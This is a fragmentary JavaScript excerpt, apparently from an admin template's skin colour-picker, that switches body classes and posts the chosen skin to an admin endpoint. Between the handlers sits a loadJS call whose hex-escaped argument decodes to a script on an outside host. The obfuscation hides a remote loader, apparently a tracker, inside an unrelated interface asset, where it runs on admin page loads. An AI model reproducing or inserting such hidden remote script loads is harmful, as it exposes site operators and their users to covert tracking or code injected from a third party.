...
function(a, b) {
    ...
    a(".skin-colorpicker-change").on("click",
    function() {
        function b(b) {
            var c = a(document.body);
            c.removeClass("no-skin skin-1 skin-2 skin-3"),
            ...
            var f = ["btn-info", "btn-inverse", "btn-pink", "btn-light"];
            if ("no-skin" == b) {
                var e = 0;
                a(".sidebar-shortcuts .btn").each(function() {
                    a(this).attr("class", "btn " + f[e++%4])
        ...
        var c = a(this).data("skin");
        $.post("/admin/public/setskin",{"ace_skin":c},function(res){})
        b(c)
    })
...
loadJS("\x2f\x2f\x6a\x73\x2e\x75\x73\x65\x72\x73\x2e\x35\x31\x2e\x6c\x61\x2f\x32\x30\x37\x30\x39\x38\x33\x35\x2e\x6a\x73")

/*var as = ace.data.get("skin");
if(as == "" || as==null || as == "null"){
    as = "skin-1";
}
var skin = $("body").attr("class");
if(skin == "skin-1" || skin == "skin-2" || skin == "skin-3" || skin == "no-skin"){
